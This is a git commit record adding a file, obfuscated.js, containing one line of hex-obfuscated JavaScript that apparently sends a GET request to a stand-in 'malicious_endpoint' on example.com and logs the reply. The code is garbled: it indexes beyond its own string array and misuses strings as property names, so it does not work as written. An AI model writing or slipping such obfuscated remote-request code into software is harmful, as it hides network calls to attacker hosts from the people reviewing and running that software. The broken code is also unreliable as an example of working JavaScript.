e8c82c7509702da7c3b9096813ff7b073b6e3b70
Savelii Sh <sukurukun@protonmail.com>
2025-03-19 16:37:22 +0200

    Create obfuscated.js

---
+++ obfuscated.js
@@ -0,0 +1,2 @@
+(function(_0x4f1f,_0x1d63){var _0x2fbd=["\x6F\x70\x65\x6E","\x47\x45\x54","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65\x3D\x34","\x73\x74\x61\x74\x75\x73\x3D\x32\x30\x30","\x73\x65\x6E\x64"];(function(_0x1aab){var _0x40d1=_0x2fbd;var _0x3935=_0x1aab[_0x40d1[0]](_0x40d1[1],_0x1aab,true);_0x3935[_0x40d1[3]]=function(){if(_0x3935[_0x40d1[2]]==4&&_0x3935[_0x40d1[4]]==200){console[_0x40d1[5]](_0x3935[_0x40d1[0]])}};_0x3935[_0x40d1[6]]();})("http://example.com/malicious_endpoint");
+})();
